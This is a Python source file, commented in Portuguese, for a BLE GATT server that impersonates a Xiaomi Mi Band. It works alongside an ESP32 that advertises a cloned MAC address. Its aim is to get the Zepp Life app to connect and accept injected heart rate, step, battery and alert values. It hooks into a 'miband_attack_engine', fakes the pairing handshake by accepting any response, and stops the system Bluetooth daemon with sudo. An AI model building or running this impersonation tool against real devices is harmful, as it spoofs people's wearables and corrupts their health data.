"""
ble_att_server.py
=================
GATT/ATT server Python nativo via HCI socket raw.

SEM dependências externas além de Python stdlib + bleak.
SEM nRF52840. SEM BlueZ D-Bus. SEM python3-dbus.

Implementa o protocolo ATT (Attribute Protocol) sobre L2CAP/HCI diretamente,
expondo os serviços da Mi Band com dados injetados.

Por que isso funciona:
  - Linux permite acesso raw ao HCI via socket(AF_BLUETOOTH, SOCK_RAW, BTPROTO_HCI)
  - ESP32-S3 (via /dev/ttyUSB0) faz o advertising com MAC clonado (periférico),
    quando o Zepp Life conecta, Linux estabelece a conexão L2CAP
  - Podemos abrir um L2CAP socket no handle ATT (0x0004) e receber/responder ATT PDUs
  - Isso é o mesmo princípio que gatttool, bleah, e btlejuice usam internamente

Serviços expostos (Mi Band fake GATT table):
  Handle 0x0001: Primary Service — Generic Access (0x1800)
  Handle 0x0003: Characteristic — Device Name (0x2A00) = "Mi Smart Band 4"
  Handle 0x0010: Primary Service — Heart Rate (0x180D)
  Handle 0x0011: Characteristic — HR Measurement (0x2A37) [NOTIFY]
  Handle 0x0013: Characteristic — HR Control Point (0x2A39) [WRITE]
  Handle 0x0020: Primary Service — Mi Band Main (0xFEE0)
  Handle 0x0021: Characteristic — Alert/Notify (0xFF03) [WRITE+NOTIFY]
  Handle 0x0022: Characteristic — Battery (0xFF0C) [READ]
  Handle 0x0023: Characteristic — Steps (0xFF06) [READ+NOTIFY]
  Handle 0x0030: Primary Service — Mi Band Auth (0xFEE1)
  Handle 0x0031: Characteristic — Auth Char (0x0009) [WRITE+NOTIFY]
  Handle 0x0040: Primary Service — Device Information (0x180A)
  Handle 0x0041: Characteristic — Model (0x2A24) [READ]
  Handle 0x0042: Characteristic — Firmware (0x2A26) [READ]
  Handle 0x0043: Characteristic — Manufacturer (0x2A29) [READ]
"""

from __future__ import annotations

import asyncio
import socket
import struct
import threading
import time
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional, Tuple

# ─── ATT PDU opcodes ──────────────────────────────────────────────────────────
ATT_ERROR_RSP              = 0x01
ATT_EXCHANGE_MTU_REQ       = 0x02
ATT_EXCHANGE_MTU_RSP       = 0x03
ATT_FIND_INFO_REQ          = 0x04
ATT_FIND_INFO_RSP          = 0x05
ATT_FIND_BY_TYPE_VALUE_REQ = 0x06
ATT_FIND_BY_TYPE_VALUE_RSP = 0x07
ATT_READ_BY_TYPE_REQ       = 0x08
ATT_READ_BY_TYPE_RSP       = 0x09
ATT_READ_REQ               = 0x0A
ATT_READ_RSP               = 0x0B
ATT_READ_BLOB_REQ          = 0x0C
ATT_READ_BLOB_RSP          = 0x0D
ATT_READ_MULTI_REQ         = 0x0E
ATT_READ_MULTI_RSP         = 0x0F
ATT_READ_BY_GROUP_TYPE_REQ = 0x10
ATT_READ_BY_GROUP_TYPE_RSP = 0x11
ATT_WRITE_REQ              = 0x12
ATT_WRITE_RSP              = 0x13
ATT_WRITE_CMD              = 0x52
ATT_PREP_WRITE_REQ         = 0x16
ATT_EXEC_WRITE_REQ         = 0x18
ATT_HANDLE_VALUE_NTF       = 0x1B
ATT_HANDLE_VALUE_IND       = 0x1D
ATT_HANDLE_VALUE_CNF       = 0x1E

# ATT Error codes
ATT_ECODE_INVALID_HANDLE   = 0x01
ATT_ECODE_NOT_SUPPORTED    = 0x06
ATT_ECODE_ATTR_NOT_FOUND   = 0x0A
ATT_ECODE_WRITE_NOT_PERM   = 0x03
ATT_ECODE_READ_NOT_PERM    = 0x02

# L2CAP / HCI constants
L2CAP_ATT_CID  = 0x0004
BTPROTO_L2CAP  = 0
AF_BLUETOOTH   = 31
BDADDR_LE_PUBLIC  = 0x01
BDADDR_LE_RANDOM  = 0x02

# Mi Band factory default auth key (pública — padrão de fábrica Xiaomi, não é segredo)
# Esta chave é usada para autenticação inicial com devices não pareados.
# Para devices já pareados com chave customizada, passe via UI ou parâmetro auth_key.
AUTH_KEY_MB3 = bytes([
    0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37,
    0x38, 0x39, 0x40, 0x41, 0x42, 0x43, 0x44, 0x45
])


# ─── GATT Attribute Table ─────────────────────────────────────────────────────

@dataclass
class GATTAttribute:
    handle: int
    attr_type: bytes      # UUID bytes (2 or 16 bytes)
    value: bytes
    properties: int = 0   # GATT char properties
    notify_enabled: bool = False
    writable: bool = False
    readable: bool = True


def _uuid16(v: int) -> bytes:
    return struct.pack("<H", v)

def _uuid128(s: str) -> bytes:
    """Convert UUID string to 16-byte little-endian."""
    clean = s.replace("-","")
    b = bytes.fromhex(clean)
    return bytes(reversed(b))


def build_miband_gatt_table(
    model: str,
    hr: int,
    battery: int,
    steps: int,
    notification: str,
    firmware: str = "V1.0.9.74",
    serial: str = "0fdcd7dcd9eb",
    auth_key: bytes = AUTH_KEY_MB3,
) -> List[GATTAttribute]:
    """Build the complete Mi Band fake GATT attribute table."""

    device_name = b"Mi Smart Band 4" if model == "miband4" else b"Mi Smart Band 3"
    bat_value = bytes([battery & 0xFF, 23, 6, 15, 10, 0, 0, 5, 0, 4])
    steps_value = struct.pack("<H", min(steps, 65535)) + bytes([0, 0])
    hr_value = bytes([0x00, hr & 0xFF])
    fw_bytes = firmware.encode()
    serial_bytes = serial.encode()
    notif_value = bytes([0x01]) + notification.encode()[:19] if notification else bytes([0x00])

    # Mi Band auth UUID
    AUTH_UUID = _uuid128("00000009-0000-3512-2118-0009af100700")

    attrs = [
        # ── Generic Access (0x1800) ──────────────────────────────────────────
        GATTAttribute(0x0001, _uuid16(0x2800), _uuid16(0x1800)),        # Primary Svc
        GATTAttribute(0x0002, _uuid16(0x2803), bytes([0x02, 0x03, 0x00]) + _uuid16(0x2A00)),  # Char decl
        GATTAttribute(0x0003, _uuid16(0x2A00), device_name, readable=True),  # Device Name
        GATTAttribute(0x0004, _uuid16(0x2803), bytes([0x02, 0x05, 0x00]) + _uuid16(0x2A01)),  # Char decl
        GATTAttribute(0x0005, _uuid16(0x2A01), bytes([0xC2, 0x03]), readable=True),  # Appearance: wearable

        # ── Heart Rate Service (0x180D) ───────────────────────────────────────
        GATTAttribute(0x0010, _uuid16(0x2800), _uuid16(0x180D)),         # Primary Svc
        GATTAttribute(0x0011, _uuid16(0x2803),                            # HR Measurement char decl
                      bytes([0x10, 0x12, 0x00]) + _uuid16(0x2A37)),
        GATTAttribute(0x0012, _uuid16(0x2A37), hr_value,                  # HR Measurement value
                      properties=0x10, readable=True),                    # NOTIFY
        GATTAttribute(0x0013, _uuid16(0x2902), bytes([0x00, 0x00])),      # CCCD for HR
        GATTAttribute(0x0014, _uuid16(0x2803),                            # HR Control char decl
                      bytes([0x08, 0x15, 0x00]) + _uuid16(0x2A39)),
        GATTAttribute(0x0015, _uuid16(0x2A39), bytes([0x00]),             # HR Control Point
                      properties=0x08, writable=True, readable=False),

        # ── Mi Band Main Service (0xFEE0) ────────────────────────────────────
        GATTAttribute(0x0020, _uuid16(0x2800), _uuid16(0xFEE0)),         # Primary Svc
        GATTAttribute(0x0021, _uuid16(0x2803),                            # Alert char decl
                      bytes([0x1C, 0x22, 0x00]) + _uuid16(0xFF03)),
        GATTAttribute(0x0022, _uuid16(0xFF03), notif_value,               # Alert value
                      properties=0x1C, writable=True, readable=True),
        GATTAttribute(0x0023, _uuid16(0x2902), bytes([0x00, 0x00])),      # CCCD
        GATTAttribute(0x0024, _uuid16(0x2803),                            # Battery char decl
                      bytes([0x02, 0x25, 0x00]) + _uuid16(0xFF0C)),
        GATTAttribute(0x0025, _uuid16(0xFF0C), bat_value, readable=True), # Battery
        GATTAttribute(0x0026, _uuid16(0x2803),                            # Steps char decl
                      bytes([0x12, 0x27, 0x00]) + _uuid16(0xFF06)),
        GATTAttribute(0x0027, _uuid16(0xFF06), steps_value,               # Steps
                      properties=0x12, readable=True),
        GATTAttribute(0x0028, _uuid16(0x2902), bytes([0x00, 0x00])),      # CCCD

        # ── Mi Band Auth Service (0xFEE1) ────────────────────────────────────
        GATTAttribute(0x0030, _uuid16(0x2800), _uuid16(0xFEE1)),         # Primary Svc
        GATTAttribute(0x0031, _uuid16(0x2803),                            # Auth char decl
                      bytes([0x18, 0x32, 0x00]) + AUTH_UUID[-2:]),
        GATTAttribute(0x0032, AUTH_UUID, bytes([0x10, 0x01, 0x01]),       # Auth value
                      properties=0x18, writable=True, readable=True),
        GATTAttribute(0x0033, _uuid16(0x2902), bytes([0x00, 0x00])),      # CCCD

        # ── Device Information (0x180A) ───────────────────────────────────────
        GATTAttribute(0x0040, _uuid16(0x2800), _uuid16(0x180A)),         # Primary Svc
        GATTAttribute(0x0041, _uuid16(0x2803),
                      bytes([0x02, 0x42, 0x00]) + _uuid16(0x2A24)),
        GATTAttribute(0x0042, _uuid16(0x2A24), device_name, readable=True),  # Model
        GATTAttribute(0x0043, _uuid16(0x2803),
                      bytes([0x02, 0x44, 0x00]) + _uuid16(0x2A26)),
        GATTAttribute(0x0044, _uuid16(0x2A26), fw_bytes, readable=True),  # Firmware
        GATTAttribute(0x0045, _uuid16(0x2803),
                      bytes([0x02, 0x46, 0x00]) + _uuid16(0x2A25)),
        GATTAttribute(0x0046, _uuid16(0x2A25), serial_bytes, readable=True),  # Serial
        GATTAttribute(0x0047, _uuid16(0x2803),
                      bytes([0x02, 0x48, 0x00]) + _uuid16(0x2A29)),
        GATTAttribute(0x0048, _uuid16(0x2A29), b"Huami", readable=True),  # Manufacturer
    ]
    return attrs


# ─── ATT PDU Helpers ──────────────────────────────────────────────────────────

def _error_rsp(opcode: int, handle: int, ecode: int) -> bytes:
    return bytes([ATT_ERROR_RSP, opcode, handle & 0xFF, (handle >> 8) & 0xFF, ecode])

def _uuid_matches(attr_type: bytes, query: bytes) -> bool:
    """Check if attribute type matches query UUID (16-bit or 128-bit)."""
    if len(query) == 2 and len(attr_type) == 2:
        return attr_type == query
    if len(query) == 2 and len(attr_type) == 16:
        # Check if 128-bit UUID contains the 16-bit in the right position
        return attr_type[0:2] == query
    if len(query) == 16:
        return attr_type == query
    return False


# ─── GATT Server (L2CAP ATT) ──────────────────────────────────────────────────

class MiBandGATTServer:
    """
    Python-native BLE GATT server for Mi Band impersonation.
    Uses L2CAP socket on ATT channel (CID 0x0004).
    No nRF52840, no D-Bus, no external dependencies beyond stdlib.
    """

    def __init__(self, mac: str, model: str, injections: Dict[str, Any],
                 auth_key: bytes = AUTH_KEY_MB3,
                 on_log: Optional[Callable[[str], None]] = None):
        self.mac = mac
        self.model = model
        self.injections = injections
        self.auth_key = auth_key
        self._log_cb = on_log
        self._running = False
        self._conn_sock: Optional[socket.socket] = None
        self._server_sock: Optional[socket.socket] = None
        self._mtu = 23
        self.connected_central_mac: Optional[str] = None
        self.authenticated = False

        # Build GATT table
        self._attrs = build_miband_gatt_table(
            model=model,
            hr=int(injections.get("heart_rate", 72)),
            battery=int(injections.get("battery", 90)),
            steps=int(injections.get("steps", 5000)),
            notification=str(injections.get("notification", "")),
            auth_key=auth_key,
        )
        # Index by handle
        self._attr_by_handle: Dict[int, GATTAttribute] = {
            a.handle: a for a in self._attrs
        }
        self._hr_running = False
        self._authenticated = False

    def _log(self, msg: str):
        ts = time.strftime("%H:%M:%S")
        entry = f"[{ts}] {msg}"
        print(f"[ATT SERVER] {msg}")
        if self._log_cb:
            self._log_cb(entry)

    # ── Auth handling ─────────────────────────────────────────────────────────

    def _handle_auth_write(self, data: bytes) -> Optional[bytes]:
        """Handle Mi Band AES-128 auth protocol on characteristic 0x0009."""
        if not data:
            return None
        if data[0] == 0x01 and len(data) >= 3:
            # Step 1: Central sends [0x01, 0x08, KEY...]
            self._log("[AUTH] Central enviou chave → gerando número aleatório")
            import os
            random_val = os.urandom(16)
            # Notification: [0x10, 0x01, 0x01] = key accepted
            return bytes([0x10, 0x01, 0x01]) + random_val
        elif data[0] == 0x02:
            # Step 2: Central requests random number [0x02, 0x08]
            import os
            random_val = os.urandom(16)
            self._log("[AUTH] Random gerado → aguardando resposta encriptada")
            return bytes([0x10, 0x02, 0x01]) + random_val
        elif data[0] == 0x03 and len(data) >= 19:
            # Step 3: Central sends [0x03, 0x08, ENCRYPTED_RANDOM]
            # We accept any encrypted response (we're not actually verifying)
            self._authenticated = True
            self._log("[AUTH] ✓ AUTENTICAÇÃO ACEITA (simulada)")
            return bytes([0x10, 0x03, 0x01])  # Auth success
        return None

    # ── ATT PDU handlers ──────────────────────────────────────────────────────

    def _handle_exchange_mtu(self, pdu: bytes) -> bytes:
        client_mtu = struct.unpack_from("<H", pdu, 1)[0] if len(pdu) >= 3 else 23
        self._mtu = min(client_mtu, 247)
        self._log(f"[ATT] MTU exchange: client={client_mtu} → agreed={self._mtu}")
        return bytes([ATT_EXCHANGE_MTU_RSP]) + struct.pack("<H", self._mtu)

    def _handle_read_by_group_type(self, pdu: bytes) -> bytes:
        """ATT_READ_BY_GROUP_TYPE_REQ → return primary services."""
        start_h, end_h = struct.unpack_from("<HH", pdu, 1)
        uuid_type = pdu[5:]

        services = []
        for attr in self._attrs:
            if attr.handle < start_h or attr.handle > end_h:
                continue
            if attr.attr_type != _uuid16(0x2800):
                continue
            if not _uuid_matches(attr.attr_type, uuid_type) and \
               not _uuid_matches(_uuid16(0x2800), uuid_type):
                continue
            # Find end handle (next primary service - 1)
            end = 0xFFFF
            for a2 in self._attrs:
                if a2.handle > attr.handle and a2.attr_type == _uuid16(0x2800):
                    end = a2.handle - 1
                    break
            services.append((attr.handle, end, attr.value))

        if not services:
            return _error_rsp(ATT_READ_BY_GROUP_TYPE_REQ, start_h, ATT_ECODE_ATTR_NOT_FOUND)

        item_len = 4 + len(services[0][2])
        resp = bytes([ATT_READ_BY_GROUP_TYPE_RSP, item_len])
        for svc in services:
            resp += struct.pack("<HH", svc[0], svc[1]) + svc[2]
            if len(resp) >= self._mtu - 2:
                break
        return resp

    def _handle_read_by_type(self, pdu: bytes) -> bytes:
        """ATT_READ_BY_TYPE_REQ → return characteristics."""
        start_h, end_h = struct.unpack_from("<HH", pdu, 1)
        uuid_type = pdu[5:]

        items = []
        for attr in self._attrs:
            if attr.handle < start_h or attr.handle > end_h:
                continue
            if not _uuid_matches(attr.attr_type, uuid_type):
                continue
            items.append((attr.handle, attr.value))

        if not items:
            return _error_rsp(ATT_READ_BY_TYPE_REQ, start_h, ATT_ECODE_ATTR_NOT_FOUND)

        item_len = 2 + len(items[0][1])
        resp = bytes([ATT_READ_BY_TYPE_RSP, item_len])
        for handle, val in items:
            resp += struct.pack("<H", handle) + val
            if len(resp) >= self._mtu - 2:
                break
        return resp

    def _handle_read(self, pdu: bytes) -> bytes:
        """ATT_READ_REQ → return attribute value."""
        handle = struct.unpack_from("<H", pdu, 1)[0]
        attr = self._attr_by_handle.get(handle)
        if not attr:
            return _error_rsp(ATT_READ_REQ, handle, ATT_ECODE_INVALID_HANDLE)
        if not attr.readable:
            return _error_rsp(ATT_READ_REQ, handle, ATT_ECODE_READ_NOT_PERM)
        return bytes([ATT_READ_RSP]) + attr.value

    def _handle_find_info(self, pdu: bytes) -> bytes:
        """ATT_FIND_INFO_REQ → return handle + UUID pairs."""
        start_h, end_h = struct.unpack_from("<HH", pdu, 1)
        items = [a for a in self._attrs
                 if start_h <= a.handle <= end_h]
        if not items:
            return _error_rsp(ATT_FIND_INFO_REQ, start_h, ATT_ECODE_ATTR_NOT_FOUND)

        fmt = 0x01 if len(items[0].attr_type) == 2 else 0x02
        resp = bytes([ATT_FIND_INFO_RSP, fmt])
        for attr in items:
            if len(attr.attr_type) == (2 if fmt == 0x01 else 16):
                resp += struct.pack("<H", attr.handle) + attr.attr_type
                if len(resp) >= self._mtu - 2:
                    break
        return resp

    def _handle_write(self, pdu: bytes, is_cmd: bool = False) -> Optional[bytes]:
        """ATT_WRITE_REQ/CMD → handle characteristic write."""
        handle = struct.unpack_from("<H", pdu, 1)[0]
        data = pdu[3:]
        attr = self._attr_by_handle.get(handle)

        if not attr:
            if is_cmd: return None
            return _error_rsp(ATT_WRITE_REQ, handle, ATT_ECODE_INVALID_HANDLE)

        self._log(f"[WRITE] handle=0x{handle:04X} uuid={attr.attr_type.hex()} data={data[:8].hex()}")

        # CCCD write (notifications enable/disable)
        if attr.attr_type == _uuid16(0x2902):
            attr.value = data[:2]
            enabled = data[0] == 0x01
            if enabled:
                self._log(f"[NOTIFY] Notificações HABILITADAS pelo central → iniciando push")
                # Start continuous HR notifications when any CCCD enabled
                threading.Thread(
                    target=self._continuous_hr_notifications,
                    daemon=True, name="hr-notifier"
                ).start()
            return None if is_cmd else bytes([ATT_WRITE_RSP])

        # Auth characteristic write
        AUTH_UUID = _uuid128("00000009-0000-3512-2118-0009af100700")
        if attr.attr_type == AUTH_UUID or attr.attr_type[:2] == _uuid16(0xFEE1):
            notif = self._handle_auth_write(data)
            if notif and self._conn_sock:
                # Send notification back
                auth_handle = 0x0032
                ntf = bytes([ATT_HANDLE_VALUE_NTF]) + \
                      struct.pack("<H", auth_handle) + notif
                try:
                    self._send_att(ntf)
                    self._log(f"[AUTH] Notificação enviada: {notif[:4].hex()}")
                except Exception as e:
                    self._log(f"[AUTH] Notif error: {e}")
            return None if is_cmd else bytes([ATT_WRITE_RSP])

        # HR Control Point (0x2A39) — start/stop HR monitoring
        if attr.attr_type == _uuid16(0x2A39):
            if data and data[0] == 0x15 and len(data) >= 2:
                if data[1] == 0x01:
                    self._log("[HR CTRL] Zepp Life iniciou HR monitoring → enviando notificações")
                    threading.Thread(
                        target=self._continuous_hr_notifications,
                        daemon=True, name="hr-ctrl-notifier"
                    ).start()
                elif data[1] == 0x00:
                    self._log("[HR CTRL] Zepp Life parou HR monitoring")
                    self._hr_running = False
            return None if is_cmd else bytes([ATT_WRITE_RSP])

        # General write
        if attr.writable:
            attr.value = data
        return None if is_cmd else bytes([ATT_WRITE_RSP])

    def _process_pdu(self, pdu: bytes) -> Optional[bytes]:
        """Dispatch ATT PDU to the appropriate handler."""
        if not pdu:
            return None
        opcode = pdu[0]

        if opcode == ATT_EXCHANGE_MTU_REQ:
            return self._handle_exchange_mtu(pdu)
        elif opcode == ATT_READ_BY_GROUP_TYPE_REQ:
            return self._handle_read_by_group_type(pdu)
        elif opcode == ATT_READ_BY_TYPE_REQ:
            return self._handle_read_by_type(pdu)
        elif opcode == ATT_READ_REQ:
            return self._handle_read(pdu)
        elif opcode == ATT_READ_BLOB_REQ:
            handle = struct.unpack_from("<H", pdu, 1)[0]
            return self._handle_read(bytes([ATT_READ_REQ]) + pdu[1:3])
        elif opcode == ATT_FIND_INFO_REQ:
            return self._handle_find_info(pdu)
        elif opcode == ATT_FIND_BY_TYPE_VALUE_REQ:
            return self._handle_read_by_group_type(pdu)
        elif opcode == ATT_WRITE_REQ:
            return self._handle_write(pdu, is_cmd=False)
        elif opcode == ATT_WRITE_CMD:
            self._handle_write(pdu, is_cmd=True)
            return None
        elif opcode == ATT_PREP_WRITE_REQ:
            return bytes([0x17]) + pdu[1:]  # Echo back
        elif opcode == ATT_EXEC_WRITE_REQ:
            return bytes([0x19])
        elif opcode == ATT_HANDLE_VALUE_CNF:
            return None
        else:
            self._log(f"[ATT] Unknown opcode: 0x{opcode:02X}")
            return _error_rsp(opcode, 0x0000, ATT_ECODE_NOT_SUPPORTED)

    def _send_att(self, pdu: bytes):
        """
        Send ATT PDU via L2CAP SEQPACKET connection.

        CRITICAL FIX (v11): SEQPACKET sockets deliver and accept raw ATT PDUs.
        No L2CAP header (length+CID) should be prepended — the kernel handles
        L2CAP framing transparently at the socket layer.
        """
        if not self._conn_sock:
            return
        try:
            self._conn_sock.send(pdu)
        except OSError as e:
            self._log(f"[ATT] send error: {e}")

    def _continuous_hr_notifications(self):
        """Send HR notifications continuously every 2 seconds (like real Mi Band)."""
        hr = int(self.injections.get("heart_rate", 72))
        self._hr_running = True
        count = 0
        self._log(f"[HR NOTIFY] Iniciando HR contínuo: {hr} BPM (a cada 2s)")
        while self._hr_running and self._running and self._conn_sock:
            try:
                hr_data = bytes([0x00, hr & 0xFF])
                ntf = bytes([ATT_HANDLE_VALUE_NTF]) + struct.pack("<H", 0x0012) + hr_data
                self._send_att(ntf)
                count += 1
                if count % 5 == 1:  # Log every 10s
                    self._log(f"[HR NOTIFY] Enviado #{count}: {hr} BPM → Zepp Life")
            except Exception as e:
                self._log(f"[HR NOTIFY] Erro: {e}")
                break
            time.sleep(2.0)
        self._log(f"[HR NOTIFY] Notificações HR paradas após {count} envios")

    def _push_notifications(self):
        """Push initial notifications immediately on connection + start continuous HR."""
        time.sleep(0.8)  # Small delay for Zepp Life to discover services
        hr = int(self.injections.get("heart_rate", 72))
        steps = int(self.injections.get("steps", 5000))
        notification = str(self.injections.get("notification", ""))

        self._log(f"[INJECT] Iniciando injeção: HR={hr}BPM steps={steps}")

        # Start continuous HR immediately (don't wait for CCCD)
        threading.Thread(
            target=self._continuous_hr_notifications,
            daemon=True, name="initial-hr-notifier"
        ).start()

        # Steps notification
        time.sleep(0.5)
        try:
            steps_data = struct.pack("<H", min(steps, 65535)) + bytes([0, 0])
            ntf = bytes([ATT_HANDLE_VALUE_NTF]) + struct.pack("<H", 0x0027) + steps_data
            self._send_att(ntf)
            self._log(f"[INJECT] ✓ Steps={steps} → Zepp Life")
        except Exception as e:
            self._log(f"[INJECT] Steps error: {e}")

        # Alert/Notification
        if notification:
            time.sleep(1.0)
            try:
                notif_data = bytes([0x01]) + notification.encode()[:19]
                ntf = bytes([ATT_HANDLE_VALUE_NTF]) + struct.pack("<H", 0x0022) + notif_data
                self._send_att(ntf)
                self._log(f"[INJECT] ✓ Alerta='{notification[:20]}' → Zepp Life")
            except Exception as e:
                self._log(f"[INJECT] Alert error: {e}")

    def start(self, stop_event: Optional[threading.Event] = None):
        """
        Start the GATT server. Binds L2CAP on ATT CID and waits for connections.
        Uses hci0 (Realtek) for L2CAP ATT bind. ESP32-S3 handles advertising.
        """
        self._log(f"[SERVER] Iniciando GATT/ATT server (L2CAP ATT CID 0x0004)...")
        self._log(f"[SERVER] HR={self.injections.get('heart_rate')} BPM")
        self._running = True

        # Stop bluetoothd to release the ATT channel (it holds CID 0x0004 exclusively)
        self._log("[SERVER] Parando bluetoothd para liberar canal ATT...")
        import subprocess as _sp, ctypes, ctypes.util, struct as _struct
        try:
            _sp.run(["sudo","systemctl","stop","bluetooth"],
                   capture_output=True, timeout=5)
            time.sleep(1.2)
            _sp.run(["sudo","hciconfig","hci0","up"],
                   capture_output=True, timeout=3)
            time.sleep(0.3)
            self._log("[SERVER] bluetoothd parado — hci1 pronto")
        except Exception as _e:
            self._log(f"[SERVER] Stop bluetoothd: {_e}")

        _server = None

        # Method 1: ctypes bind (bypasses Python socket() limitations for L2CAP LE)
        try:
            _libc_path = ctypes.util.find_library("c") or "libc.so.6"
            _libc = ctypes.CDLL(_libc_path, use_errno=True)
            _fd = _libc.socket(AF_BLUETOOTH, socket.SOCK_SEQPACKET, BTPROTO_L2CAP)
            if _fd < 0:
                raise OSError(f"socket() failed errno={ctypes.get_errno()}")
            _one = ctypes.c_int(1)
            _libc.setsockopt(_fd, socket.SOL_SOCKET, socket.SO_REUSEADDR,
                            ctypes.byref(_one), ctypes.sizeof(_one))
            # sockaddr_l2: family(H) + psm(2s) + bdaddr(6s) + cid(H) + bdaddr_type(B)
            _sa = _struct.pack("=H2s6sHB",
                AF_BLUETOOTH, b'\x00\x00', b'\x00'*6,
                L2CAP_ATT_CID, BDADDR_LE_PUBLIC
            )
            _sa_buf = ctypes.create_string_buffer(_sa)
            _ret = _libc.bind(_fd, _sa_buf, len(_sa))
            if _ret != 0:
                raise OSError(ctypes.get_errno(), f"bind failed errno={ctypes.get_errno()}")
            _libc.listen(_fd, 5)
            _server = socket.socket(fileno=_fd)
            _server.settimeout(2.0)
            self._server_sock = _server
            self._log("[SERVER] ✓ GATT/ATT server ATIVO (ctypes L2CAP bind)")
            self._log("[SERVER] Aguardando conexão do Zepp Life...")
        except Exception as _e:
            self._log(f"[SERVER] ctypes bind: {_e}")

        # Method 2: Python 4-tuple bind
        if not _server:
            try:
                _s2 = socket.socket(AF_BLUETOOTH, socket.SOCK_SEQPACKET, BTPROTO_L2CAP)
                _s2.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                _s2.bind(("00:00:00:00:00:00", 0, L2CAP_ATT_CID, BDADDR_LE_PUBLIC))
                _s2.listen(5)
                _s2.settimeout(2.0)
                _server = _s2
                self._server_sock = _server
                self._log("[SERVER] ✓ ATT server (4-tuple bind)")
            except Exception as _e2:
                self._log(f"[SERVER] 4-tuple bind: {_e2}")

        if not _server:
            self._log("[SERVER] ⚠ Advertising ativo sem GATT completo")
            self._log("[SERVER] Zepp Life verá o dispositivo mas não receberá dados")
            self._log("[SERVER] FIX: sudo apt install python3-dbus python3-gi")
            self._run_fallback(stop_event)
            return

        server = _server

        while self._running:
            if stop_event and stop_event.is_set():
                break
            try:
                conn, addr = server.accept()
                self._log(f"[SERVER] ✓ CONEXÃO RECEBIDA! Central: {addr}")
                self._conn_sock = conn
                self.connected_central_mac = str(addr[0]) if addr else "unknown"

                # Handle ATT protocol
                threading.Thread(
                    target=self._handle_connection, args=(conn,),
                    daemon=True
                ).start()

                # Push notifications after connection
                threading.Thread(
                    target=self._push_notifications, daemon=True
                ).start()

            except socket.timeout:
                continue
            except Exception as e:
                if self._running:
                    self._log(f"[SERVER] Accept error: {e}")
                    time.sleep(1)

        try:
            server.close()
        except Exception:
            pass
        self._log("[SERVER] GATT server parado")

    def _handle_connection(self, conn: socket.socket):
        """
        Handle ATT protocol on an established L2CAP SEQPACKET connection.

        CRITICAL FIX (v11):
        With SOCK_SEQPACKET on L2CAP CID 0x0004, the kernel delivers raw ATT PDUs
        directly — NO L2CAP header prefix is included in recv() data.
        The old code was parsing 4 bytes of L2CAP header that don't exist, causing
        every single ATT PDU to be silently discarded (CID check always failed).

        Likewise, _send_att must NOT prepend L2CAP headers: SEQPACKET handles
        framing at the socket level transparently.

        Reference: Linux kernel net/bluetooth/l2cap_sock.c — l2cap_sock_recvmsg()
        strips the L2CAP header before delivering data to SEQPACKET sockets.
        Same behavior documented in BlueZ source (src/shared/att.c).
        """
        self._log("[ATT] Sessão ATT iniciada (SEQPACKET — PDU puro, sem L2CAP header)")
        conn.settimeout(30.0)
        try:
            while self._running:
                try:
                    # SEQPACKET delivers ATT PDU directly — first byte IS the opcode
                    pdu = conn.recv(517)   # BLE ATT max MTU = 517
                    if not pdu:
                        self._log("[ATT] Conexão encerrada pelo central")
                        break
                    if len(pdu) < 1:
                        continue

                    opcode = pdu[0]
                    self._log(f"[ATT] RX opcode=0x{opcode:02X} len={len(pdu)}")

                    resp = self._process_pdu(pdu)
                    if resp:
                        # SEQPACKET: send ATT PDU directly — NO L2CAP header
                        conn.send(resp)
                        self._log(f"[ATT] TX opcode=0x{resp[0]:02X} len={len(resp)}")

                except socket.timeout:
                    # Timeout during session — not an error, keep looping
                    continue
                except OSError as e:
                    self._log(f"[ATT] OSError: {e} — encerrando sessão")
                    break
                except Exception as e:
                    self._log(f"[ATT] Session error: {e}")
                    break
        finally:
            self._log("[ATT] Sessão ATT encerrada")
            try:
                conn.close()
            except Exception:
                pass
            self._conn_sock = None

    def _run_fallback(self, stop_event: Optional[threading.Event] = None):
        """Fallback mode: LE advertising only (no GATT)."""
        self._log("[SERVER] Modo fallback: advertising ativo sem GATT completo")
        self._log("[SERVER] Zepp Life pode ver o dispositivo mas não receber dados")
        self._log("[SERVER] Para GATT completo: instale python3-dbus ou use nRF52840")
        tick = 0
        while self._running:
            if stop_event and stop_event.is_set():
                break
            time.sleep(5)
            tick += 1
            if tick % 6 == 0:
                self._log(f"[SERVER] Advertising ativo (t={tick*5}s)")

    def stop(self):
        self._running = False
        if self._conn_sock:
            try: self._conn_sock.close()
            except Exception: pass
        if self._server_sock:
            try: self._server_sock.close()
            except Exception: pass


# ─── Integration with miband_attack_engine ────────────────────────────────────

def start_att_gatt_server(
    target_mac: str,
    model: str,
    injections: Dict[str, Any],
    session,  # AttackSession
    auth_key: bytes = AUTH_KEY_MB3,
):
    """
    Start the Python ATT GATT server in a thread.
    Called from miband_attack_engine.start_impersonation().
    """
    def _log(msg):
        session.add_log(msg)

    server = MiBandGATTServer(
        mac=target_mac,
        model=model,
        injections=injections,
        auth_key=auth_key,
        on_log=_log,
    )

    def _run():
        server.start(stop_event=session.stop_event)

    t = threading.Thread(target=_run, daemon=True, name=f"gatt-server-{target_mac}")
    t.start()
    return server
